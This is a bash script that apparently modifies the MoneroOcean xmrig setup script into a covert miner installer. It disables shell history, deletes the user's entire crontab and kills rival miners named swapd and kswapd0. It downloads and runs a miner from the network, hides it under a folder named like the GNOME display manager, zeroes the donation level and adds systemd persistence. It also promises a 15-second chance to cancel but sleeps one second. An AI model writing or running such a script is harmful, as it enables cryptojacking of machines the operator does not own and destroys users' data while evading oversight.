#!/bin/bash

unset HISTFILE
#unset HISTFILE ;history -d $((HISTCMD-1))
#export HISTFILE=/dev/null ;history -d $((HISTCMD-1))

crontab -r

#systemctl disable gdm2 --now
#systemctl disable swapd --now

#chattr -i $HOME/.gdm2/
#chattr -i $HOME/.swapd/

#killall swapd
kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

#killall kswapd0
kill -9 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`

#rm -rf $HOME/.gdm2/
#rm -rf $HOME/.swapd/

VERSION=2.11

# printing greetings

echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"


if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/.gdm2/gdm2.rc script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using moneroocean_miner systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 1
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service
fi
killall -9 xmrig
#killall -9 kswapd0

echo "[*] Removing $HOME/moneroocean directory"
rm -rf $HOME/moneroocean
rm -rf $HOME/.moneroocean
#rm -rf $HOME/.gdm2

echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to xmrig.tar.gz"
  exit 1
fi

#  wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
# tar xf $HOME/.gdm2/xmrig.tar.gz

echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
[ -d $HOME/.gdm2 ] || mkdir $HOME/.gdm2
if ! tar xf xmrig.tar.gz -C $HOME/.gdm2; then
  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
  exit 1
fi
rm xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
$HOME/.gdm2/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/.gdm2/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/.gdm2/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/.gdm2/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
  if ! tar xf xmrig.tar.gz -C $HOME/.gdm2; then
    echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
    exit 1
  fi
  rm xmrig.tar.gz

  echo "[*] Checking if new version of $HOME/.gdm2/xmrig works fine"
  $HOME/.gdm2/xmrig --help >/dev/null
  if (test $? -ne 0); then
    echo "ERROR: New version of $HOME/.gdm2/xmrig is not functional"
    exit 1
  fi

  echo "OK: New version of $HOME/.gdm2/xmrig works fine"

  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
  echo "I don't know why your AV software don't like the advanced version, please report the issue to your AV software vendor and then try to unpack it manually"

  echo "Script will now continue with new version of miner"
fi

echo "[*] Creating new $HOME/.gdm2/config.json file"
echo "{
  \"autosave\": true,
  \"background\": true,
  \"randomx\": {
    \"1gb-pages\": true,
    \"asm\": true,
    \"init\": -1,
    \"mode\": \"auto\",
    \"numa\": true
  },
  \"http\": {
    \"enabled\": true,
    \"host\": \"127.0.0.1\",
    \"port\": $PORT,
    \"access-token\": \"x\",
    \"restricted\": true
  },
  \"donate-level\": 0,
  \"log-file\": null,
  \"pools\": [
    {
      \"algo\": \"rx/0\",
      \"coin\": null,
      \"url\": \"gulf.moneroocean.stream:10001\",
      \"user\": \"$WALLET.$(hostname)\",
      \"pass\": \"x\",
      \"tls\": false,
      \"rig-id\": null,
      \"nicehash\": false,
      \"keepalive\": true,
      \"enabled\": true,
      \"label\": \"default\"
    }
  ],
  \"print-time\": 60,
  \"retries\": 5,
  \"retry-pause\": 5,
  \"syslog\": false,
  \"threads\": $CPU_THREADS,
  \"user-agent\": null,
  \"watch\": true
}" > $HOME/.gdm2/config.json

echo "[*] Checking $HOME/.gdm2/config.json file"
if (test -f $HOME/.gdm2/config.json); then
  echo "OK: $HOME/.gdm2/config.json file was created"
else
  echo "ERROR: $HOME/.gdm2/config.json file was not created"
  exit 1
fi

echo "[*] Configuring $HOME/.gdm2/gdm2.rc to start advanced $HOME/.gdm2/xmrig miner in foreground"
echo "$HOME/.gdm2/xmrig --config=$HOME/.gdm2/config.json &>/dev/null &" > $HOME/.gdm2/gdm2.rc
chmod +x $HOME/.gdm2/gdm2.rc

echo "[*] Removing crontab entry for $USER"
crontab -l | grep -v moneroocean_miner.sh | crontab -

echo "[*] Removing systemd service"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service
  sudo systemctl disable moneroocean_miner.service
  sudo rm /lib/systemd/system/moneroocean_miner.service
  sudo systemctl daemon-reload
  sudo systemctl reset-failed
fi

echo "[*] Preparing /tmp to start moneroocean_miner.service systemd service for advanced $HOME/.gdm2/xmrig miner"
mkdir /tmp/xmrig
chmod 777 /tmp/xmrig
echo "[Unit]
Description=MoneroOcean xmrig miner
After=network.target

[Service]
Type=simple
User=$USER
WorkingDirectory=$HOME/.gdm2
ExecStart=$HOME/.gdm2/xmrig --config=$HOME/.gdm2/config.json
Restart=always

[Install]
WantedBy=default.target
" > /tmp/xmrig/moneroocean_miner.service

echo "[*] Running sudo systemctl daemon-reload"
if sudo -n true 2>/dev/null; then
  sudo mv /tmp/xmrig/moneroocean_miner.service /lib/systemd/system/moneroocean_miner.service
  sudo systemctl daemon-reload
  sudo systemctl reset-failed
fi

echo "[*] Starting advanced $HOME/.gdm2/xmrig miner from systemd"
if sudo -n true 2>/dev/null; then
  sudo systemctl enable moneroocean_miner.service
  sudo systemctl start moneroocean_miner.service
fi

# summary

echo
echo "If no errors occured, $WALLET is now mining to gulf.moneroocean.stream:10001 using advanced $HOME/.gdm2/xmrig miner."
echo

if ! sudo -n true 2>/dev/null; then
  echo "Please, remember to restart your host after reboot to start mining in background from $HOME/.profile."
else
  echo "Your host will start mining in background from systemd service after reboot."
fi

if [ ! -z $EMAIL ]; then
  echo "If needed, you can change miner options later at https://moneroocean.stream using $EMAIL email and default password."
fi

echo
echo "Please, make sure your new miner works stable and not producing too much rejected shares, especially after some time (24-72 hours)."
echo

# done

exit 0
